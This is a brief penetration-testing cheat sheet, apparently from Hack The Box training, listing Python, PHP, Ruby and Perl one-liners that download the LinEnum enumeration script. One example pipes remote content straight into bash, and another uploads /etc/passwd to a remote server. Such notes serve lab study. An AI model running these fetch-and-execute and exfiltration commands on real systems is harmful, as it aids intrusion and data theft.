Transfer with Code
######################

Using python to transfer code.

Example 1: using Python 2

.. code-block:: console


   Temen@htb[/htb]$ python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'

Example 2: using Python3

.. code-block:: console

   Temen@htb[/htb]$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'

Example 3: Using PHP to download

.. code-block:: console

   Temen@htb[/htb]$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'

Example 4: PHP with fOpen

.. code-block:: console

   Temen@htb[/htb]$ php -r 'const BUFFER = 1024; $fremote = 
   fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

Example 5: php download a file and pipe to bash

.. code-block:: console

   Temen@htb[/htb]$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash

Example 6: Using Ruby

.. code-block:: console

   Temen@htb[/htb]$ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'

Example 7: Using Perl

.. code-block:: console

   Temen@htb[/htb]$ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'

Upload operations with Python3

Start a python upload server

.. code-block:: console


   python3 -m uploadserver

Upload the file from the host

.. code-block:: console

   Temen@htb[/htb]$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
